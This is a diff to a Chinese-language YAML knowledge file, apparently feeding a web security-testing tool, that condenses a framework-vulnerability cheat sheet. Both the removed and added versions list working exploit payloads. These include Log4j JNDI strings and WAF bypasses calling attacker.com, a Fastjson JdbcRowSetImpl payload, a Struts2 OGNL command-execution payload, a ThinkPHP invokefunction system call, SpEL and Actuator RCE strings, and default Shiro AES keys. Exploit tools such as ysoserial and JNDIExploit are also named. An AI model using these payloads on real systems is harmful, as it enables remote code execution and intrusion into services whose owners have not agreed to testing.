@@ -1,26 +1,96 @@
 name: 框架安全测试
-description: Spring、Django、Flask等框架安全测试
+description: 主流框架漏洞 - Spring/Log4j/Shiro/Fastjson/Struts2/ThinkPHP
 domain: web
-version: '1.0'
+version: '3.0'
 tags:
 - web
 - framework
-- spring
-- django
-knowledge: "# 框架漏洞\n\n## 1. Spring Boot Actuator\n\n### 端点探测\n\n```\n/actuator\n/actuator/env\n/actuator/health\n/actuator/heapdump\n\
-  /actuator/loggers\n/actuator/refresh\n/actuator/mappings\n```\n\n### 利用\n\n```\n# 获取环境变量\n/actuator/env\n\n# 触发RCE\n/actuator/refresh\n\
-  POST: {\"name\":\"test\",\"value\":\"#{T(java.lang.Runtime).getRuntime().exec('whoami')}\"}\n```\n\n---\n\n## 2. Spring\
-  \ SpEL注入\n\n### 基础RCE\n\n```\n${T(java.lang.Runtime).getRuntime().exec('id')}\n```\n\n### 读取文件\n\n```\n${T(org.apache.commons.io.FileUtils).readFileToString(T(java.io.File).new('/etc/passwd'))}\n\
-  ```\n\n---\n\n## 3. Log4j RCE (CVE-2021-44228)\n\n### 基础Payload\n\n```\n${jndi:ldap://attacker.com/a}\n${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}\n\
-  ```\n\n### 变形Payload\n\n```\n${jndi:rmi://attacker.com/Exploit}\n${jndi:ldap://attacker.com/Exploit}\n${${lower:j}ndi:${lower:l}dap://attacker.com/a}\n\
-  ```\n\n---\n\n## 4. Fastjson反序列化\n\n### 基础Payload\n\n```json\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\"\
-  :\"ldap://attacker.com/Exploit\",\"autoCommit\":true}\n```\n\n### JdbcRowSetImpl\n\n```json\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"\
-  ,\"dataSourceName\":\"ldap://attacker.com/Exploit\",\"autoCommit\":true}\n```\n\n---\n\n## 5. Shiro反序列化\n\n### RememberMe攻击\n\
-  \n1. 常见密钥:\n   - kPH+bIxk5D2deZiIxcaaaA==\n   - 4AvVhmFLUs0KTA3KprsdGv==\n   - etc.\n\n### 利用工具\n\n```bash\njava -jar shiro-attack-2.0.jar\n\
-  ```\n\n---\n\n## 6. Struts2 RCE\n\n### 基础Payload\n\n```\n%{#a=(new java.lang.ProcessBuilder('id')).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new\
-  \ java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[4096],#d.read(#e),#t=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#t.getWriter().write(new\
-  \ java.lang.String(#e))}\n```\n\n---\n\n## 7. ThinkPHP RCE\n\n### 基础Payload\n\n```\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami\n\
-  ```\n\n---\n\n## 8. Laravel RCE\n\n### .env文件泄露\n\n### 密钥利用\n\n```\nphp artisan tinker\n```\n\n---\n\n## 9. WebLogic RCE\n\
-  \n### XMLDecoder\n\n```\nPOST /wls-wsat/CoordinatorPortType\nContent-Type: text/xml\n\n<soapenv:Envelope xmlns:soapenv=\"\
-  http://schemas.xmlsoap.org/soap/envelope/\">\n...\n```\n\n---\n\n## 10. JBoss反序列化\n\n### 攻击路径\n\n```\n/invoker/JMXInvokerServlet\n\
-  /admin-console\n```\n\n---\n\n## 11. Django\n\n### 任意文件读取\n\n### SQL注入\n\n---\n\n## 12. Flask\n\n### 模板注入\n\n### Debug模式RCE\n"
+
+knowledge: |
+  # 框架漏洞速查
+
+  ## Spring系列
+
+  | 漏洞 | 组件 | 利用方式 |
+  |------|------|----------|
+  | Spring4Shell | spring-beans | 参数绑定写Shell |
+  | SpEL注入 | spring-expression | 表达式执行 |
+  | Actuator | spring-boot-actuator | /actuator/env泄露 |
+
+  **Actuator端点**:
+  - `/actuator/env` 环境变量
+  - `/actuator/heapdump` 内存dump
+  - `/actuator/loggers` 日志配置
+
+  ---
+
+  ## Log4j (CVE-2021-44228)
+
+  **JNDI注入**: `${jndi:ldap://attacker/a}`
+
+  **绕过WAF**:
+  - `${${::-j}${::-n}${::-d}${::-i}:ldap://...}`
+  - `${${lower:j}ndi:${lower:l}dap://...}`
+  - `${jndi:rmi://...}`
+
+  **利用链**: LDAP/RMI返回恶意class
+
+  ---
+
+  ## Shiro反序列化
+
+  **RememberMe Cookie**: AES加密的序列化对象
+
+  **利用步骤**:
+  1. 获取常见密钥或爆破
+  2. ysoserial生成payload
+  3. AES加密 → Base64 → RememberMe
+
+  **常见密钥**: kPH+bIxk5D2deZiIxcaaaA== 等
+
+  ---
+
+  ## Fastjson
+
+  **反序列化RCE**:
+  ```json
+  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}
+  ```
+
+  **利用链**: JdbcRowSetImpl/TemplatesImpl
+
+  ---
+
+  ## Struts2
+
+  **OGNL表达式注入**:
+  - S2-045: Content-Type头
+  - S2-046: Content-Disposition头
+  - S2-057: URL路径
+
+  **工具**: Struts2-Scan
+
+  ---
+
+  ## ThinkPHP
+
+  **5.x RCE**: `?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`
+
+  **路由**: think\app/invokefunction调用任意函数
+
+  ---
+
+  ## WebLogic
+
+  **XMLDecoder**: `/wls-wsat/CoordinatorPortType`
+  **T3协议**: 反序列化
+  **IIOP**: 反序列化
+
+  ---
+
+  ## 工具
+
+  - **ysoserial**: Java反序列化payload生成
+  - **JNDIExploit**: JNDI注入服务器
+  - **ShiroAttack**: Shiro密钥爆破
+  - **Struts2-Scan**: Struts2漏洞扫描
